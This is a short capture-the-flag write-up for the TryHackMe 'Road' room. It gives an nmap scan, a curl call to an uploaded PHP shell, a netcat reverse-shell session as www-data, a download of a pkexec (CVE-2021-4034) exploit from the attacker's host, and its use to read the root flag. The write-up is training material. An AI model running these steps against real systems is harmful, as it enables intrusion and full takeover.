## Road
https://tryhackme.com/room/road

## Enum
```
nmap -Pn -sC -sV ip.thm -vv

Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXhjztNjrxAn+QfSDb6ugzjCwso/WiGgq/BGXMrbqex9u5Nu1CKWtv7xiQpO84MsC2li6UkIAhWSMO0F//9odK1aRpPbH97e1ogBENN6YBP0s2z27aMwKh5UMyrzo5R42an3r6K+1x8lfrmW8VOOrvR4pZg9Mo+XNR/YU88P3XWq22DNPJqwtB3q4Sw6M/nxxUjd01kcbjwd1d9G+nuDNraYkA2T/OTHfp/xbhet9K6ccFHoi+A8r6aL0GV/qqW2pm4NdfgwKxM73VQzyolkG/+DFkZc+RCH73dYLEfVjMjTbZTA+19Zd2hlPJVtay+vOZr1qJ9ZUDawU7rEJgJ4hHDqlVjxX9Yv9SfFsw+Y0iwBfb9IMmevI3osNG6+2bChAtI2nUJv0g87I31fCbU5+NF8VkaGLz/sZrj5xFvyrjOpRnJW3djQKhk/Avfs2wkZ+GiyxBOZLetSDFvTAARmqaRqW9sjHl7w4w1+pkJ+dkeRsvSQlqw+AFX0MqFxzDF7M=
|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNBLTibnpRB37eKji7C50xC9ujq7UyiFQSHondvOZOF7fZHPDn3L+wgNXEQ0wei6gzQfiZJmjQ5vQ88vEmCZzBI=
|   256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPv3g1IqvC7ol2xMww1gHLeYkyUIe8iKtEBXznpO25Ja
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sky Couriers
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-favicon: Unknown favicon MD5: FB0AA7D49532DA9D0006BA5595806138
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![image](https://user-images.githubusercontent.com/6504854/189672125-a1c803da-e06b-4f9d-b66c-9459b273b5d9.png)

![image](https://user-images.githubusercontent.com/6504854/189672251-ec9da14a-fdd9-4a6e-8666-2cc1783f4a4c.png)

![image](https://user-images.githubusercontent.com/6504854/189672535-2ed7fb7e-8684-4d65-bd4e-b7e14de7e4e2.png)

![image](https://user-images.githubusercontent.com/6504854/189672937-c49c94cb-b479-4338-963c-d92d93f1f0cb.png)

![image](https://user-images.githubusercontent.com/6504854/189673307-0549ac4a-747a-4bef-b3cd-76e078f56668.png)

![image](https://user-images.githubusercontent.com/6504854/189673521-1fc2dd5a-167b-4171-b936-eb2a2ae3985f.png)

```
curl http://ip.thm/v2/profileimages/1.php
```

## Flag
```
nc -lnvp 4444
listening on [any] 4444 ...

Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@sky:/$ cd home
cd home
www-data@sky:/home$ ls
ls
webdeveloper
www-data@sky:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root         root         4096 May 25  2021 .
drwxr-xr-x 20 root         root         4096 May 25  2021 ..
drwxr-xr-x  4 webdeveloper webdeveloper 4096 Oct  8  2021 webdeveloper
www-data@sky:/home$ cd web*
cd web*
www-data@sky:/home/webdeveloper$ ls -la
ls -la
total 36
drwxr-xr-x 4 webdeveloper webdeveloper 4096 Oct  8  2021 .
drwxr-xr-x 3 root         root         4096 May 25  2021 ..
lrwxrwxrwx 1 webdeveloper webdeveloper    9 May 25  2021 .bash_history -> /dev/null
-rw-r--r-- 1 webdeveloper webdeveloper  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 webdeveloper webdeveloper 3771 Feb 25  2020 .bashrc
drwx------ 2 webdeveloper webdeveloper 4096 May 25  2021 .cache
drwxrwxr-x 3 webdeveloper webdeveloper 4096 May 25  2021 .local
-rw------- 1 webdeveloper webdeveloper   51 Oct  8  2021 .mysql_history
-rw-r--r-- 1 webdeveloper webdeveloper  807 Feb 25  2020 .profile
-rw-r--r-- 1 webdeveloper webdeveloper    0 Oct  7  2021 .sudo_as_admin_successful
-rw-r--r-- 1 webdeveloper webdeveloper   33 May 25  2021 user.txt
www-data@sky:/home/webdeveloper$ cat user.txt
cat user.txt
63*****************************

www-data@sky:/home/webdeveloper$ ls -la /usr/bin/pkexec
ls -la /usr/bin/pkexec
-rwsr-xr-x 1 root root 31032 Aug 16  2019 /usr/bin/pkexec

www-data@sky:/home/webdeveloper$ cd /tmp
cd /tmp

www-data@sky:/tmp$ curl http://10.10.10.10/1.tar -o 1.tar
www-data@sky:/tmp$ tar -xvf 1.tar
tar -xvf 1.tar
./cve-2021-4034
./cve-2021-4034.c
./cve-2021-4034.sh
./README.md

www-data@sky:/tmp$ ./cve-2021-4034
./cve-2021-4034
# cat /root/root.txt
cat /root/root.txt
3a**************************
#
```

Thank you for your time, Happy Hacking. 😄

本当はLD_Preload?を使うはずなんすけど、またもや手抜きで。。。（いい加減権限昇格整理せねば、、、あとWindows）

☁️☁️☁️



